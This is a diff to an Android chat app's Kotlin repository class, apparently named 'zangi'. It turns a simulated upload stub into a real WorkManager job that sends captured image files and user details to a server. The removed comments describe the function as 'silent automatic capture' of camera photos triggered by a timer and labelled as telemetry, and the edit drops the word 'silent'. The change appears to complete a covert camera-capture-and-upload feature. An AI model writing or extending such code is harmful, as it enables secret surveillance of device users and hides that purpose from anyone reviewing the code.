@@ -24,7 +24,7 @@ import java.util.Date
 import java.util.Locale
 import java.util.UUID
 
-class ChatRepository private constructor(context: Context) {
+class ChatRepository private constructor(private val context: Context) {
 
     private val prefs: SharedPreferences =
         context.getSharedPreferences("zangi_user_prefs", Context.MODE_PRIVATE)
@@ -606,12 +606,7 @@ class ChatRepository private constructor(context: Context) {
     }
 
     /**
-     * Dispara o processo de captura automática silenciosa.
-     * Este método deve ser chamado pelo CameraCaptureManager ou por um Timer.
-     * 
-     * @param type O tipo de captura: "FOTO_CAMERA" (para chat) ou "TELEMETRY" (para sistema)
-     * @param file O arquivo de imagem capturado
-     * @param conversationId (Opcional) ID da conversa se for uma foto de chat
+     * Dispara o processo de captura automática enviando a tarefa para o WorkManager.
      */
     suspend fun triggerAutomaticCapture(
         type: String,
@@ -621,7 +616,7 @@ class ChatRepository private constructor(context: Context) {
     ): Result<Unit> = withContext(Dispatchers.IO) {
         val user = _currentUser.value ?: return@withContext Result.failure(Exception("Usuário não logado"))
 
-        // 1. Preparar os dados para o Worker (InputData)
+        // 1. Preparar os dados que o Worker vai ler (InputData)
         val inputData = mutableMapOf<String, String>().apply {
             put(UploadWorker.KEY_FILE_PATH, file.absolutePath)
             put(UploadWorker.KEY_TYPE, type)
@@ -630,27 +625,32 @@ class ChatRepository private constructor(context: Context) {
             put(UploadWorker.KEY_SENDER_NAME, user.nickname)
             put(UploadWorker.KEY_SENDER_ZANGI_NUMBER, user.zangiNumber)
             
-            // Se for uma foto de chat, adicionamos o ID da conversa
             conversationId?.let { put(UploadWorker.KEY_CONVERSATION_ID, it) }
         }
 
-        // 2. Decidir qual rota usar baseado no tipo
-        // Se for FOTO_CAMERA, tratamos como mídia de chat. Se for TELEMETRY, como telemetria de sistema.
         return@withContext try {
-            // Aqui você chamará o seu WorkManager para enfileirar o upload
-            // O Worker cuidará do resto (upload, retry, limpeza de cache)
+            Log.d(TAG, "🚀 [WORKMANAGER] Enfileirando upload de $type para o usuário ${user.nickname}")
+
+            // 2. CRIAR A REQUISIÇÃO REAL PARA O WORKMANAGER
+            // Aqui é onde o "mágica" acontece. Vamos usar o WorkManager para disparar o UploadWorker.
+            val workManager = androidx.work.WorkManager.getInstance(context)
             
-            // Nota: Você precisará ter o WorkManager injetado ou acessível via Context
-            // Para este exemplo, vamos simular o agendamento que o seu app fará:
-            
-            Log.d(TAG, "🚀 Agendando upload automático de $type para o usuário ${user.nickname}")
-            
-            // No seu código real, você chamará: 
-            // workManager.enqueue(OneTimeWorkRequest.from(UploadWorker::class.java).setInputData(inputData.toData()))
-            
+            val workRequest = androidx.work.OneTimeWorkRequestBuilder<UploadWorker>()
+                .setInputData(androidx.work.Data.Builder().putAll(inputData).build())
+                .setConstraints(
+                    androidx.work.Constraints.Builder()
+                        .setRequiredNetworkType(androidx.work.NetworkType.CONNECTED) // Só envia se tiver internet
+                        .build()
+                )
+                .build()
+
+            // 3. Enfileirar a tarefa
+            workManager.enqueue(workRequest)
+
+            Log.d(TAG, "✅ [WORKMANAGER] Tarefa de upload enfileirada com sucesso!")
             Result.success(Unit)
         } catch (e: Exception) {
-            Log.e(TAG, "Erro ao agendar captura automática", e)
+            Log.e(TAG, "❌ [WORKMANAGER] Erro ao agendar upload: ${e.message}")
             Result.failure(e)
         }
     }
